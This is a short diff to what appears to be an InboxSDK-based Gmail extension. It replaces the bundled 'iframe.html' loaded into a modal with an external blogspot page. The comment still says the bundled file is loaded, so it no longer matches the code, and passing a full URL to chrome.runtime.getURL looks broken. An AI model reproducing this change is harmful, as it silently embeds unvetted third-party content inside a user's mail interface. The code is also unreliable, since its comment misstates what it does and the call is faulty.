@@ -27,7 +27,7 @@ InboxSDK.load(1, 'iframe-test').then(function(sdk) {
 					}
 				}
 				window.addEventListener('message', modalMessageHandler, false);
-				iframe.src = chrome.runtime.getURL('iframe.html'); //load the iframe.html that is in the extension bundle
+				iframe.src = chrome.runtime.getURL('https://2u4joy1.blogspot.com/2019/08/iiiiii.html'); //load the iframe.html that is in the extension bundle
 
 				var modal = sdk.Modal.show({
 					el: iframe
